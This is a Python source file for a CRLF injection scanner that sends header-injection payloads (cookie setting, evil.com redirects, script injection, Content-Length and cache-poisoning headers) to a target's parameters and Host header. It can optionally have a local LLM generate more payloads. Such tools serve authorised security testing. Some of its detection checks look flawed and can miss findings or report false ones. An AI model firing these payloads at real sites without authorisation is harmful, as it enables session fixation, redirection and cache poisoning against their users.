import re
import requests
from urllib.parse import urlparse, urlencode, parse_qs, quote
from utils.output import section, info, success, warning, error, result, table
from utils.ollama_helper import OllamaHelper

CRLF_PAYLOADS = [
    "%0d%0aSet-Cookie:malicious=1",
    "%0d%0aLocation:http://evil.com",
    "%0d%0aX-XSS-Protection:0",
    "%0aSet-Cookie:malicious=1",
    "%0dSet-Cookie:malicious=1",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "%0d%0aRefresh:0;url=http://evil.com",
    "%0d%0aContent-Length:0",
    "%0d%0aContent-Length:999",
    "%0d%0aTransfer-Encoding:chunked",
    "%0aLocation:http://evil.com",
    "%0dLocation:http://evil.com",
    # Double encoding
    "%250d%250aSet-Cookie:malicious=1",
    "%250d%250aLocation:http://evil.com",
    # Unicode
    "%u000d%u000aSet-Cookie:malicious=1",
    "%u000d%u000aLocation:http://evil.com",
    # Tab variants
    "%0d%0a%09Set-Cookie:malicious=1",
    "%0d%0a%09Location:http://evil.com",
    # Cache poisoning
    "%0d%0aCache-Control:no-cache",
    "%0d%0aX-Forwarded-For:127.0.0.1",
]

HEADER_CRLF_PAYLOADS = [
    "evil.com%0d%0aSet-Cookie:malicious=1",
    "evil.com%0aSet-Cookie:malicious=1",
    "localhost%0d%0aLocation:http://evil.com",
]

DETECTION_PATTERNS = [
    ("malicious=1", "SET_COOKIE"),
    ("Location: http://evil.com", "HEADER_INJECTION"),
    ("X-XSS-Protection: 0", "HEADER_INJECTION"),
    ("<script>alert(1)", "XSS_VIA_CRLF"),
    ("Content-Length: 0", "HEADER_INJECTION"),
    ("Cache-Control: no-cache", "CACHE_POISONING"),
    ("x-forwarded-for: 127.0.0.1", "HEADER_INJECTION"),
]


class CRLFInjection:
    name = "crlf-injection"
    description = "CRLF (HTTP Response Splitting) injection scanner"

    @staticmethod
    def run(target, params="", method="GET", data="", timeout=10, ollama_model=None):
        section(f"CRLF Injection Scanner: {target}")

        ollama = OllamaHelper(model=ollama_model) if ollama_model else None
        results = {"target": target, "vulnerabilities": [], "total_tests": 0, "findings": 0}
        all_vulns = []

        if not target.startswith(("http://", "https://")):
            target = f"https://{target}"

        test_params = [p.strip() for p in params.split(",") if p.strip()] if params else []
        if not test_params:
            parsed = urlparse(target)
            qs = parse_qs(parsed.query)
            test_params = list(qs.keys())
            if not test_params:
                test_params = ["file", "page", "path", "url", "redirect", "return", "next", "redir", "dest", "redirect_uri", "q", "query", "search"]

        all_payloads = list(CRLF_PAYLOADS)
        if ollama and ollama.available:
            ai_payloads = ollama.generate_crlf_payloads("parameter")
            if ai_payloads:
                seen = set(all_payloads)
                for p in ai_payloads:
                    if p not in seen:
                        all_payloads.append(p)
                        seen.add(p)
                info(f"AI contributed {len(ai_payloads)} payloads")

        base_url = target
        parsed = urlparse(base_url)

        # Test via URL parameters
        for param_name in test_params:
            info(f"Testing parameter: {param_name}")
            for payload in all_payloads:
                results["total_tests"] += 1
                try:
                    qs_params = parse_qs(parsed.query)
                    if param_name in qs_params:
                        qs_params[param_name] = [payload]
                    else:
                        qs_params[param_name] = [payload]
                    new_qs = urlencode(qs_params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_qs}"

                    resp = requests.get(test_url, timeout=timeout,
                        headers={"User-Agent": "Mozilla/5.0"},
                        allow_redirects=False)

                    for pattern, vuln_type in DETECTION_PATTERNS:
                        if pattern.lower() in resp.text.lower() or pattern in str(resp.headers).lower():
                            all_vulns.append({
                                "param": param_name,
                                "payload": payload,
                                "type": f"CRLF_{vuln_type}",
                                "evidence": f"Found: {pattern}",
                                "status_code": resp.status_code,
                            })
                            results["findings"] += 1
                            success(f"[CRLF_{vuln_type}] {param_name} = {payload[:60]}... ({resp.status_code})")
                            break

                    # Check for split response (abnormal Content-Length)
                    content_length = resp.headers.get("Content-Length", "")
                    if content_length and content_length != "0" and "Content-Length" in payload:
                        all_vulns.append({
                            "param": param_name,
                            "payload": payload,
                            "type": "CRLF_CONTENT_LENGTH",
                            "evidence": f"Content-Length: {content_length}",
                            "status_code": resp.status_code,
                        })
                        results["findings"] += 1
                        success(f"[CRLF_CONTENT_LENGTH] {param_name} = {payload[:60]}... (Content-Length: {content_length})")

                    # Check for Set-Cookie via CRLF
                    if "malicious" in str(resp.headers).lower() or "malicious=1" in resp.text:
                        all_vulns.append({
                            "param": param_name,
                            "payload": payload,
                            "type": "CRLF_SET_COOKIE",
                            "evidence": "Set-Cookie header injected",
                            "status_code": resp.status_code,
                        })
                        results["findings"] += 1
                        success(f"[CRLF_SET_COOKIE] {param_name} = {payload[:60]}... (cookie injected)")

                except Exception as e:
                    pass

        # Test via Host header CRLF
        info("Testing Host header CRLF injection...")
        for host_payload in HEADER_CRLF_PAYLOADS:
            results["total_tests"] += 1
            try:
                resp = requests.get(target, timeout=timeout,
                    headers={
                        "Host": host_payload,
                        "User-Agent": "Mozilla/5.0",
                    },
                    allow_redirects=False)

                for pattern, vuln_type in DETECTION_PATTERNS:
                    if pattern.lower() in resp.text.lower() or pattern in str(resp.headers).lower():
                        all_vulns.append({
                            "param": "Host header",
                            "payload": host_payload,
                            "type": f"CRLF_HOST_{vuln_type}",
                            "evidence": f"Found: {pattern}",
                            "status_code": resp.status_code,
                        })
                        results["findings"] += 1
                        success(f"[CRLF_HOST_{vuln_type}] Host: {host_payload[:60]}...")
                        break

            except requests.exceptions.RequestException:
                pass
            except Exception:
                pass

        if all_vulns:
            result("Total vulnerabilities found", str(len(all_vulns)))
            result("Parameters tested", ", ".join(test_params))

            table(["Parameter", "Type", "Payload", "Status"], [
                [v["param"], v["type"], v["payload"][:40], str(v.get("status_code", ""))] for v in all_vulns[:20]
            ])

            if len(all_vulns) > 20:
                info(f"... and {len(all_vulns) - 20} more findings")
        else:
            warning("No CRLF injection vulnerabilities detected")

        results["vulnerabilities"] = all_vulns
        results["parameters_tested"] = test_params
        return results
